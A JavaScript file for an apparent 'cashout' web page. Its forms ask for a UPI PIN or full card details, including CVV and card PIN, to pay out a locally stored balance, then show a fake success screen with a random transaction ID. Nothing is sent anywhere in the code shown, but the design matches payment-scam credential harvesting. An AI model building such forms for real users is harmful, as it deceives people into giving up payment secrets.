class CashoutManager {
    constructor() {
        this.initializeElements();
        this.attachEventListeners();
        this.loadBalance();
        this.selectPaymentMethod('upi'); 
    }
    
    initializeElements() {
        this.upiOption = document.getElementById('upi-option');
        this.bankOption = document.getElementById('bank-option');        
        this.upiForm = document.getElementById('upi-form');
        this.bankForm = document.getElementById('bank-form');        
        this.balanceElement = document.getElementById('balance');
        this.successScreen = document.getElementById('success-screen');
        this.cardNumberInput = document.getElementById('card-number');
        this.expiryInput = document.getElementById('expiry');
        this.cvvInput = document.getElementById('cvv');
        this.cardPinInput = document.getElementById('card-pin');        
        this.upiIdInput = document.getElementById('upi-id');
        this.upiPinInput = document.getElementById('upi-pin');
        
        if (!this.upiOption || !this.bankOption || !this.upiForm || 
            !this.bankForm || !this.balanceElement) {
            console.error('Required elements not found. Check your HTML IDs.');
        }
    }
    
    attachEventListeners() {
        if (this.upiOption) {
            this.upiOption.addEventListener('click', () => this.selectPaymentMethod('upi'));
        }
        
        if (this.bankOption) {
            this.bankOption.addEventListener('click', () => this.selectPaymentMethod('bank'));
        }
        
        if (this.upiForm) {
            this.upiForm.addEventListener('submit', (e) => this.handleUpiSubmission(e));
        }
        
        if (this.bankForm) {
            this.bankForm.addEventListener('submit', (e) => this.handleBankSubmission(e));
        }
        
        if (this.cardNumberInput) {
            this.cardNumberInput.addEventListener('input', (e) => this.formatCardNumber(e));
        }
        
        if (this.expiryInput) {
            this.expiryInput.addEventListener('input', (e) => this.formatExpiry(e));
        }
        
        if (this.cvvInput) {
            this.cvvInput.addEventListener('input', (e) => this.formatCVV(e));
        }
    }
    
    loadBalance() {
        try {
            const balance = localStorage.getItem('earnings') || '0.00';
            if (this.balanceElement) {
                this.balanceElement.textContent = parseFloat(balance).toFixed(2);
            }
        } catch (error) {
            console.error('Error loading balance:', error);
            if (this.balanceElement) {
                this.balanceElement.textContent = '0.00';
            }
        }
    }
    
    selectPaymentMethod(method) {
        // Add animation class
        const targetOption = method === 'upi' ? this.upiOption : this.bankOption;
        
        this.upiOption.classList.remove('selected');
        this.bankOption.classList.remove('selected');
        this.upiForm.classList.add('hidden');
        this.bankForm.classList.add('hidden');
        
        // Add selected class with animation
        targetOption.classList.add('selected');
        
        if (method === 'upi') {
            setTimeout(() => {
                this.upiForm.classList.remove('hidden');
                if (this.upiIdInput) this.upiIdInput.focus();
            }, 100);
        } else {
            setTimeout(() => {
                this.bankForm.classList.remove('hidden');
                if (this.cardNumberInput) this.cardNumberInput.focus();
            }, 100);
        }
    }
    
    formatCardNumber(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{4})/g, '$1 ').trim();
        e.target.value = value.substring(0, 19);
    }

    formatExpiry(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0,2) + '/' + value.slice(2,4);
        }
        e.target.value = value;
    }

    formatCVV(e) {
        let value = e.target.value.replace(/\D/g, '');
        e.target.value = value.substring(0, 3);
    }

    validateUpiId(upiId) {
        const upiRegex = /^[\w.-]+@[\w.-]+$/;
        return upiRegex.test(upiId);
    }

    validateCardNumber(cardNumber) {
        const num = cardNumber.replace(/\s/g, '');
        return num.length === 16 && !isNaN(num);
    }

    handleUpiSubmission(e) {
        e.preventDefault();
        const upiId = this.upiIdInput.value;
        const upiPin = this.upiPinInput.value;

        if (!this.validateUpiId(upiId)) {
            alert('Please enter a valid UPI ID');
            return;
        }

        if (!upiPin) {
            alert('Please enter UPI PIN');
            return;
        }

        this.processPayment('upi', { upiId, upiPin });
    }

    handleBankSubmission(e) {
        e.preventDefault();
        const cardNumber = this.cardNumberInput.value;
        const expiry = this.expiryInput.value;
        const cvv = this.cvvInput.value;
        const pin = this.cardPinInput.value;

        if (!this.validateCardNumber(cardNumber)) {
            alert('Please enter a valid card number');
            return;
        }

        if (!cvv) {
            alert('Please enter CVV');
            return;
        }

        if (!pin) {
            alert('Please enter PIN');
            return;
        }

        this.processPayment('bank', { cardNumber, expiry, cvv, pin });
    }

    showSuccessScreen() {
        const transactionId = 'TXN' + Math.random().toString(36).substr(2, 9).toUpperCase();        
        const amount = this.balanceElement.textContent;
        
        // Get current date in readable format
        const now = new Date();
        const dateOptions = { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
        const formattedDate = now.toLocaleDateString('en-US', dateOptions);
        
        document.getElementById('transactionId').textContent = transactionId;
        document.getElementById('amount').textContent = amount;
        document.getElementById('transaction-date').textContent = formattedDate;
        
        // Hide payment options and forms
        this.upiOption.style.display = 'none';
        this.bankOption.style.display = 'none';
        this.upiForm.style.display = 'none';
        this.bankForm.style.display = 'none';
        
        const backButton = document.querySelector('.back-button');
        if (backButton) {
            backButton.style.display = 'none';
        }
        
        if (this.successScreen) {
            this.successScreen.classList.remove('hidden');
            setTimeout(() => {
                this.successScreen.classList.add('show');
            }, 100);
        }
        
        localStorage.setItem('earnings', '0');
    }

    processPayment(method, details) {
        const submitBtn = document.querySelector(`#${method}-form .submit-btn`);
        submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
        submitBtn.disabled = true;
        submitBtn.classList.add('loading');
        
        // Simulate processing delay
        setTimeout(() => {
            this.showSuccessScreen();
        }, 2000);
    }
}

function goBack() {
    window.location.replace('../index.html');
}

document.addEventListener('DOMContentLoaded', () => {
    new CashoutManager();
});